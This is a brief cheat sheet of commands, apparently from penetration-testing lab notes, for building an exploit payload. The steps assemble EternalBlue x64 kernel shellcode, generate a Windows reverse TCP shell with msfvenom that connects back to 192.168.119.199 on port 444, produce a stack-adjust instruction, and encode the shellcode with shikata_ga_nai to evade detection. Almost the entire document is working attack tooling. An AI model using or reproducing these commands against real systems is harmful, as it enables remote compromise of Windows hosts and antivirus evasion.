### General assembler
```
nasm -f bin eternalblue_x64_kshellcode.asm -o sc_x64_kernel.bin
```

### Create raw
```
msfvenom -p windows/shell/reverse_nonx_tcp LHOST=192.168.119.199 LPORT=444 -f raw -o payload
```

### nasm to hex
```
msf-nasm_shell
sub esp,0xdac
```

### Encode
```
msfvenom -p generic/custom PAYLOADFILE=./stackadj -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin
cat stackadj | msfvenom -p - -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o new-shellcode.bin
```
